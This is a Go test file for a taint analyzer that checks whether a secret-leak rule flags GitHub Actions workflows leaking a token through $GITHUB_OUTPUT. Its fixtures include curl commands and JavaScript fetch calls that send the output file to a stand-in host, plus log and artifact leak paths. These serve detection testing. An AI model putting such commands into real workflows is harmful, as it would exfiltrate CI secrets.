package taint

import (
	"fmt"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestShellOutputCommandFileContents(t *testing.T) {
	for _, tc := range []struct {
		name, read string
		kind       Kind
	}{
		{"log", `cat "$GITHUB_OUTPUT"`, Log},
		{"alias log", `file="$GITHUB_OUTPUT"; cat "$file"`, Log},
		{"network", `curl --data @"$GITHUB_OUTPUT" https://example.test`, Network},
		{"upload", `curl -T "$GITHUB_OUTPUT" https://example.test`, Network},
		{"summary", `cat "$GITHUB_OUTPUT" >> "$GITHUB_STEP_SUMMARY"`, Summary},
		{"artifact", `cat "$GITHUB_OUTPUT" > saved.txt`, Artifact},
	} {
		for _, directory := range []string{"", "subdir"} {
			t.Run(tc.name+"/"+directory, func(t *testing.T) {
				producer := fmt.Sprintf("      - id: producer\n        working-directory: %q\n        run: |\n          echo \"token=$TOKEN\" >> \"$GITHUB_OUTPUT\"\n          %s\n", directory, tc.read)
				consumer := ""
				if tc.kind == Artifact {
					path := "saved.txt"
					if directory != "" {
						path = directory + "/" + path
					}
					consumer = "      - uses: actions/upload-artifact@v4\n        with:\n          path: " + path + "\n"
				}
				result, err := Analyze(outputWorkflow(t, producer, consumer, ""), SecretLeakRule())
				require.NoError(t, err)
				require.Empty(t, result.Gaps)
				require.Len(t, result.Findings, 1, "%+v", result.Findings)
				assert.Equal(t, tc.kind, result.Findings[0].Site.Kind)
			})
		}
	}
}

func TestJavaScriptOutputCommandFileContents(t *testing.T) {
	rule := SecretLeakRule()
	rule.JavaScript = nativeJavaScriptOptions(t)
	for _, tc := range []struct {
		name, fields string
		kind         Kind
	}{
		{"JS alias log", `uses: actions/github-script@v7
        with:
          script: 'core.setOutput("token", process.env.TOKEN); const file=process.env.GITHUB_OUTPUT; console.log(require("fs").readFileSync(file, "utf8"));'`, Log},
		{"JS network", `uses: actions/github-script@v7
        with:
          script: 'core.setOutput("token", process.env.TOKEN); fetch("https://example.test", {body:require("fs").readFileSync(process.env.GITHUB_OUTPUT)});'`, Network},
		{"JS artifact", `uses: actions/github-script@v7
        with:
          script: 'core.setOutput("token", process.env.TOKEN); const fs=require("fs"); fs.writeFileSync("saved.txt", fs.readFileSync(process.env.GITHUB_OUTPUT));'`, Artifact},
		{"JS to shell", `run: node -e 'require("@actions/core").setOutput("token", process.env.TOKEN)'; cat "$GITHUB_OUTPUT"`, Log},
		{"shell to JS", `run: echo "token=$TOKEN" >> "$GITHUB_OUTPUT"; node -e 'console.log(require("fs").readFileSync(process.env.GITHUB_OUTPUT,"utf8"))'`, Log},
	} {
		t.Run(tc.name, func(t *testing.T) {
			producer := "      - id: producer\n        " + tc.fields + "\n"
			consumer := ""
			if tc.kind == Artifact {
				consumer = "      - uses: actions/upload-artifact@v4\n        with:\n          path: saved.txt\n"
			}
			result, err := Analyze(outputWorkflow(t, producer, consumer, ""), rule)
			require.NoError(t, err)
			require.Empty(t, result.Gaps)
			require.Len(t, result.Findings, 1, "%+v", result.Findings)
			assert.Equal(t, tc.kind, result.Findings[0].Site.Kind)
		})
	}
}

func TestOutputCommandFilesAreStepLocal(t *testing.T) {
	producer := "      - id: producer\n        run: echo \"token=$TOKEN\" >> \"$GITHUB_OUTPUT\"\n"
	consumer := "      - run: cat \"$GITHUB_OUTPUT\"\n"
	result, err := Analyze(outputWorkflow(t, producer, consumer, ""), SecretLeakRule())
	require.NoError(t, err)
	require.Empty(t, result.Gaps)
	assert.Empty(t, result.Findings)
}
